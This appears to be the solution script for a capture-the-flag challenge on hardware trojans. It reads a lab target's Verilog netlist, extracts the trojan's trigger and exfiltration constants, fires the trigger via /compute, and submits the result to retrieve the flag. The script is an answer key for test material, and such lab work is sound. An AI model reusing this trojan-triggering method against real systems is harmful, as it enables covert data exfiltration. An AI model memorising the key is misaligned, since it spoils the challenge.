#!/usr/bin/env bash
set -euo pipefail
mkdir -p /app

python3 - <<'EOF'
import re, requests

BASE = "http://target:8103"

print("[*] Fetching Verilog netlist from /netlist...")
verilog = requests.get(f"{BASE}/netlist", timeout=30).text
print(verilog[:400])

# Find TROJAN_TRIGGER value in the RTL
m = re.search(r"TROJAN_TRIGGER\s*=\s*16'h([0-9a-fA-F]+)", verilog)
trigger = int(m.group(1), 16)
print(f"\n[+] Found TROJAN_TRIGGER = 0x{trigger:04X}")

# Find EXFIL_PAYLOAD to know what to submit
m2 = re.search(r"EXFIL_PAYLOAD\s*=\s*16'h([0-9a-fA-F]+)", verilog)
payload_expected = int(m2.group(1), 16)
print(f"[+] Found EXFIL_PAYLOAD  = 0x{payload_expected:04X}")

print(f"\n[*] Sending trigger word 0x{trigger:04X} to /compute...")
r = requests.post(f"{BASE}/compute", json={"data": f"{trigger:04x}"}, timeout=60)
result = int(r.json()["result"], 16)
print(f"[+] Response: 0x{result:04X}")

assert result == payload_expected, f"Trojan did not fire: got {result:#x}"

r = requests.post(f"{BASE}/flag", json={"payload": f"{result:04x}"}, timeout=30)
flag = r.json()["flag"]
print(f"[+] flag: {flag}")
with open("/app/flags.txt", "w") as f:
    f.write(flag + "\n")
print("[+] written to /app/flags.txt")
EOF
